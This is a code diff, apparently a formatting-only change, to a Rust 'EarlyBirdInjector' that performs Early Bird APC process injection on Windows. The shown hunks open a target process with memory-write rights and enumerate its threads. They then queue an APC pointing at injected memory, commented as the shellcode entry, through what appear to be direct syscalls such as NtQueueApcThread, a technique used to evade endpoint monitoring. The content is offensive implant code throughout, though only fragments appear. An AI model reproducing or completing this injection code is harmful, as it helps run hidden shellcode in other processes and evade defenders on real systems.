@@ -25,14 +25,14 @@ impl Injector for EarlyBirdInjector {
             ));
         }
 
-        use windows_sys::Win32::System::Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ};
-        use windows_sys::Win32::System::Threading::{PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION, PROCESS_VM_WRITE, THREAD_SET_CONTEXT};
         use crate::win_types::PAGE_READWRITE;
         use windows_sys::Win32::System::Diagnostics::ToolHelp::TH32CS_SNAPTHREAD;
+        use windows_sys::Win32::System::Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ};
+        use windows_sys::Win32::System::Threading::{
+            PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION, PROCESS_VM_WRITE, THREAD_SET_CONTEXT,
+        };
 
-        let access_mask = PROCESS_VM_OPERATION
-            | PROCESS_VM_WRITE
-            | PROCESS_QUERY_INFORMATION;
+        let access_mask = PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION;
 
         unsafe {
             // ── Step 1: Open target process ─────────────────────────────
@@ -194,7 +194,9 @@ impl Injector for EarlyBirdInjector {
                 cleanup_and_err!("EarlyBird: CreateToolhelp32Snapshot failed");
             }
 
-            const TE_SIZE: u32 = std::mem::size_of::<windows_sys::Win32::System::Diagnostics::ToolHelp::THREADENTRY32>() as u32;
+            const TE_SIZE: u32 = std::mem::size_of::<
+                windows_sys::Win32::System::Diagnostics::ToolHelp::THREADENTRY32,
+            >() as u32;
             let mut te = windows_sys::Win32::System::Diagnostics::ToolHelp::THREADENTRY32 {
                 dwSize: TE_SIZE,
                 ..unsafe { std::mem::zeroed() }
@@ -232,10 +234,10 @@ impl Injector for EarlyBirdInjector {
                                 let apc_status = crate::syscall!(
                                     "NtQueueApcThread",
                                     h_thread as u64,
-                                    remote_mem as u64,  // ApcRoutine → shellcode entry
-                                    0u64,               // ApcContext
-                                    0u64,               // ApcArgument1
-                                    0u64,               // ApcArgument2
+                                    remote_mem as u64, // ApcRoutine → shellcode entry
+                                    0u64,              // ApcContext
+                                    0u64,              // ApcArgument1
+                                    0u64,              // ApcArgument2
                                 );
                                 crate::syscall!("NtClose", h_thread as u64).ok();
                                 if let Ok(st) = apc_status {
